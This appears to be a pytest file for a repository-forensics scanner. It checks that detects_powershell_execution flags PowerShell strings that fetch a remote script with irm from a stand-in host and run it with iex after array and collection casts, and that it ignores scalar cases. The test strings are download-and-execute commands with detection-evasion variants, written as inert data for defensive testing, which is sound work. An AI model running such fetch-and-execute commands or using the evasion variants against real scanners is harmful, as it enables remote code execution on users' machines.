"""Independent review set 3 (inert strings): collection shape, array casts, scalar resets."""
import sys,importlib,pytest
from pathlib import Path
sys.path.insert(0,str(Path(__file__).resolve().parents[3] / 'skills/repo-forensics/scripts'))
P='$a=irm https://example.com/x.ps1; '
@pytest.mark.parametrize('module',['pre_scan','auto_scan'])
@pytest.mark.parametrize('tail',[
'$c=@("safe"); $c+=$a; $b=$c -ne "safe"; iex $b',
'$c="safe", "other"; $c += $a; $b=$c -like "*"; iex $b',
'$c=[array]$a; $b=$c -like "*"; iex $b',
'$c=[string[]]$a; $b=$c -like "*"; iex $b',
'$b=$a -as [array]; iex $b',
])
def test_collection_text_not_sanitized(module,tail):
 assert importlib.import_module(module).detects_powershell_execution(P+tail)
@pytest.mark.parametrize('module',['pre_scan','auto_scan'])
@pytest.mark.parametrize('tail',[
'$c=@($a); $c="safe"; $c=$a; $b=$c -eq "safe"; iex "Write-Output $b"',
'function Unused {$c=@($a)}; $c=$a; $b=$c -eq "safe"; iex "Write-Output $b"',
'$c="$( @($a))"; $b=$c -eq "safe"; iex "Write-Output $b"',
])
def test_scalar_result_is_not_collection(module,tail):
 assert not importlib.import_module(module).detects_powershell_execution(P+tail)
